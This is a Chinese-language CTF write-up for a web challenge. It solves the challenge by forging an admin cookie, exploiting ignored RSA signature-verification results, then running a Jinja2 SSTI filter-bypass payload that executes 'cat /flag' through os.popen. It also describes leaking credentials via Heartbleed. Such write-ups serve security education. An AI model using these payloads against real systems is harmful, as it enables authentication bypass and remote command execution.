# not so web 2

## 题目简述

第二题把 Cookie 改为“JSON 消息 + RSA PKCS#1 v1.5/SHA-256 签名”，并给管理员 SSTI 增加字符过滤。预期入口在 HTTPS 层：服务使用存在 Heartbleed 的旧 OpenSSL，可通过 TLS Heartbeat 越界读取泄露管理员凭据，再登录利用 SSTI。源码同时存在一个更直接的非预期错误：签名验证函数的布尔返回值被忽略，任意格式正确但验证失败的签名仍会被当作有效。

因此有两条完整路线：伪造 Cookie 后绕过 SSTI 过滤，或用 Heartbleed 泄露真实管理员凭据后再利用 SSTI。

## 解题过程

### 非预期解：忽略签名验证结果

Cookie 的明文格式为：

```text
Base64(json_message + "&" + signature_hex)
```

服务端计算消息哈希后执行：

```python
try:
    PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
    valid = True
except (ValueError, TypeError):
    valid = False
```

`verify()` 会返回 `True` 或 `False`；签名不匹配通常只返回 `False`，不会抛异常。代码没有接收返回值，而是在调用结束后无条件设置 `valid = True`。因此只要签名字节格式不会触发异常，就能伪造任意用户名。

公钥为 2048 位，选择 256 字节的零签名可以避免明显的长度异常：

```python
import base64
import json

msg = json.dumps({"user_name": "admin", "login_time": 0})
sig = bytes(256)
packed = msg + "&" + sig.hex()
forged = base64.b64encode(packed.encode()).decode()
```

将 `forged` 设置为 `jwbcookie`。JSON 合法、签名字节长度合理，`verify()` 返回 `False` 后代码仍置 `valid=True`，随后从消息中取出 `user_name=admin`，进入管理员页面。正确写法应是：

```python
valid = PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
```

并把 Base64、JSON、十六进制和签名解析统一放在完整异常处理边界内。

### 绕过 SSTI 字符过滤

管理员分支只逐字符检查 `payload` 参数：

```python
if char in "'_#&;":
    abort(403)
```

其他查询参数不受检查，因此可把带下划线的属性名和命令分别放入额外参数，再在 `payload` 中用 `request.args` 与 `attr` 动态取值。下面的 `payload` 本身不含单引号、下划线、井号、与号或分号：

```jinja2
{{cycler|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.cmd)|attr(request.args.read)()}}
```

同时提交：

```python
params = {
    "payload": payload,
    "init": "__init__",
    "globals": "__globals__",
    "getitem": "__getitem__",
    "os": "os",
    "popen": "popen",
    "cmd": "cat /flag",
    "read": "read",
}
```

过滤器只看到安全的 `payload` 字符串；Jinja 渲染时才从其他参数拼出 `cycler.__init__.__globals__["os"].popen(...).read()`。若希望自动生成适配不同过滤集合的表达式，可使用 [Fenjing](https://github.com/Marven11/Fenjing/tree/main)。该工具针对 Jinja SSTI 自动组合 `attr`、`getitem`、请求参数传值等 WAF 绕过，但本题所需的具体链已经如上展开，不依赖工具才能理解。

### 预期解：Heartbleed

通过 HTTP 访问 HTTPS 端口时，响应正文直接暴露了旧版本栈信息：

```text
400 Bad Request
The plain HTTP request was sent to HTTPS port
nginx/1.11.13
```

需要纠正的是，CVE-2014-0160 并不是 nginx 自身的漏洞，而是 nginx 所链接 OpenSSL 的 TLS Heartbeat 实现缺少边界检查。受影响的典型版本为 OpenSSL 1.0.1 至 1.0.1f，1.0.1g 修复；旧 nginx 版本只是提示部署栈可能同时很旧。[Heartbleed 官方说明站](https://www.heartbleed.com/)概括了漏洞影响：攻击者可反复读取服务进程内存，每次最多约 64 KiB，内容可能包含会话数据、凭据和私钥。

恶意 Heartbeat 请求声明一个远大于实际负载的长度。漏洞实现按声明长度复制响应，因而越过请求缓冲区末尾读取相邻堆内存：

```text
实际 payload：1 字节
声明长度：    0x4000 或更大
返回内容：    该 1 字节 + 后续进程堆数据
```

反复请求并从泄漏块中搜索 `admin`、登录请求字段、Cookie 或 PEM 片段，可恢复管理员密码或 TLS 私钥。题目应用还把 `/etc/ssl/nginx/local.key` 作为 Cookie 的 RSA 私钥；如果恢复该密钥，也可以自行生成合法的管理员签名 Cookie。登录后仍需使用上一节的 SSTI 绕过读取 flag。

[Vulhub 的 CVE-2014-0160 环境与 PoC](https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160)展示了畸形 Heartbeat 包的构造和泄漏结果，适合作为复现实验参考；其价值是协议实现示例，而不是代替本题中的版本确认和泄漏数据分析。

## 方法总结

非预期解是典型的“调用了安全 API，却忽略安全 API 的结论”：验证函数返回 `False` 不等于抛异常。预期解则要求把 HTTP 与 HTTPS 的部署差异纳入攻击面，并正确归因到 OpenSSL Heartbeat。无论通过哪条路线取得管理员身份，最终模板漏洞都来自把用户输入先拼入模板源码再渲染；固定模板配合变量传值才是根本修复。
